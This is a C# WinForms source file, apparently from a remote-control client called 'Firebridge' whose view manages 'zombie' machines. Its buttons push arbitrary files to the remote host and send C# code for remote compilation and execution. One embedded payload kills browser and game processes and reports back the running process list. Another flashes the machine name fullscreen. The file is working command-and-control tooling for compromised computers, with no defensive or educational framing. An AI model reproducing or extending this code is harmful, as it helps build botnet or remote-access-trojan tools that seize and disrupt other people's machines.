using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using FirebridgeClient.Controls;
using FirebridgeShared.Models;
using FirebridgeShared.Networking;

namespace FirebridgeClient.Views
{
    public partial class ZombieDetailView : Form
    {
        private Connection connection;
        private ZombieView _parent;
        public ZombieDetailView(Connection connection, ZombieView parent)
        {
            InitializeComponent();
            this.connection = connection;
            _parent = parent;

            this.BackColor = ColorTranslator.FromHtml("#2c2c54");
        }

        public void SetImage(Image image)
        {
            _image.Image = image;
        }

        public void Update(object sender, EventArgs e)
        {
            var f = new OpenFileDialog();
            f.Multiselect = true;
            if (f.ShowDialog() == DialogResult.OK)
            {
                var update = new UpdateModel() { Names = new List<string>(), Data = new List<byte[]>() };
                for (int i = 0; i < f.FileNames.Length; i++)
                {
                    update.Data.Add(File.ReadAllBytes(f.FileNames[i]));
                    update.Names.Add(f.SafeFileNames[i]);

                }
                connection.SendPacket(new Packet() { Id = 4, Data = update });
            }

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet() { Id = 2, Data = 70 });
        }

        private void ResetApp(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet() { Id = 2, Data = 71 });

        }

        private void Button4_Click(object sender, EventArgs e)
        {

            connection.SendPacket(new Packet() { Id = 50, Data = 71 });
        }


        private void SendCode(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet()
            {
                Id = 1,
                Data = new MiniProgramModel()
                {
                    Code = @"
            using System;
            using System.Diagnostics;
            using System.Linq;
            using FirebridgeShared.Networking;

            namespace TestApp
            {
                public static class Program
                {
                    public static void Main(Connection s)
                    {
                        Process[] AllProcesses = Process.GetProcesses();
                        foreach (var process in AllProcesses)
                        {
                            if (process.MainWindowTitle != """")
                            {
                                string k = process.ProcessName.ToLower();
                                if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"" || k == ""opera"" || k == ""lfs"" || k == ""witchit"")
                                    process.Kill();
                            }
                        }

                       s.SendPacket(new Packet() { Id = 0, Data = String.Join("","", Process.GetProcesses().Select(p => p.ProcessName.ToString()).ToArray())});

                            }
                }
            }",
                    EntryPoint = "TestApp.Program",
                    References = new List<string>()
                                {
                                    "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
                                },
                }
            });
        }

        private void Button4_Click_1(object sender, EventArgs e)
        {

        }


        private void Button5_Click(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet(){Id = 7});
        }

        private void Button6_Click(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet() { Id = 8 });
        }

        private void ZombieDetailView_FormClosing(object sender, FormClosingEventArgs e)
        {
            _parent.DetailShow = false;
            e.Cancel = true;
            this.Hide();

        }

        private void _image_DoubleClick(object sender, EventArgs e)
        {

        }

        private void Button7_Click(object sender, EventArgs e)
        {

            connection.SendPacket(new Packet()
            {
                Id = 1,
                Data = new MiniProgramModel()
                {
                    Code = @"using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using FirebridgeShared.Networking;
using System.Threading.Tasks;

namespace TestApp
{
    public static class Program
    {
        public static void Main(Connection s)
        {
Task.Run(() => {
            var form = new Form();
            form.FormBorderStyle = FormBorderStyle.None;
            form.WindowState = FormWindowState.Maximized;
            Label label = new Label();
            label.Text = Environment.MachineName;
            label.AutoSize = true;
            label.Font = new Font(""Microsoft Sans Serif"", 120F, FontStyle.Regular, GraphicsUnit.Point, 238);
            form.Controls.Add(label);
            form.Show();
form.BringToFront();
            label.Location = new Point(10,10);
            form.Refresh();
            Thread.Sleep(2500); form.Dispose(); });
        }
    }
}",
                    EntryPoint = "TestApp.Program",
                    References = new List<string>()
                    {
                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll","System.Drawing.dll","System.Windows.Forms.dll"
                    },
                }
            });
        }
    }
}
